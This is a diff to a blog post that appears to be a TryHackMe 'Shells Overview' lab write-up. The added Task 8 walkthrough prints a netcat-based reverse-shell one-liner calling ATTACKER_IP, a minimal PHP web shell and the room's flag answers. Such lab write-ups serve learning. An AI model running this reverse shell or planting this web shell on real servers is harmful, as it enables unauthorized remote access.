@@ -1,10 +1,9 @@
 ---
 title: Shells Overview | TryHackMe Write-Up
-publishDate: '2025-09-14'
+publishDate: '2025-09-15'
 description: Learn about the different types of shells.
 tags: [tryhackme, shells, writeup]
 heroImage: {src: './image.png', alt: 'TryHackMe'}
-draft: true
 language: 'en'
 ---
 Here i want to share about my writeup for the room [Shells Overview](https://tryhackme.com/room/shellsoverview), learn about the different types of shells. I wrote this in 2025 and hope it is useful for learning about cybersecurity.
@@ -104,6 +103,62 @@ Which scripting language can use a reverse shell by exporting environment variab
 
 ## Task 7: Web Shell
 
+A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. It can be hidden within a compromised web application or service, making it difficult to detect.
+
+Web shells can be written in languages like PHP, ASP, and JSP. After the web shell is deployed, it can be accessed through a URL to execute a command and display the result in the web browser.
+
+What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
+>Unrestricted File Upload
+
+What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
+>Web Shell
 
 ## Task 8: Practical Task
+
+To test our knowledge, let's get the flag from the vulnerable web server by clicking the Start Machine button.
+
+The challenge will be accessible on the following URLs:
+
+- `[MACHINE_IP]:8081` hosts the web application that is vulnerable to command injection.
+- `[MACHINE_IP]:8082` hosts the web application that is vulnerable to an unrestricted file upload.
+
+Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
+
+First, we can run `nc -lnvp 4444`.
+
+And then, open a new terminal and run this command to know what IP we have: `ip addr show tun0`
+
+Open the browser, go to `[MACHINE_IP]:8080`, and click "Reverse/Bind Shell Tank".
+
+And then, you can fill the input field** with this reverse shell command `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+
+And then, our listener will get a connection and we can get the flag.
+
+> THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
+
+Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
+
+We can go to `[MACHINE_IP]:8082`.
+
+And then, we can create a file named `shell.php` with this script:
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Keep the listener running on port 4444.
+
+We can upload the `shell.php` file to the website until **the upload is successful**.
+
+And then, go to this URL `[MACHINE_IP]:8082/uploads/shell.php?cmd=cat%20/flag.txt` and we get the flag.
+
+>THM{202bb14ed12120b31300cfbbbdd35998786b44e5}
+
 ## Task 9: Conclusion
+
+Reverse Shells establish a connection from a compromised machine back to an attacker's system. Bind Shells listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.
+>No Answer Needed
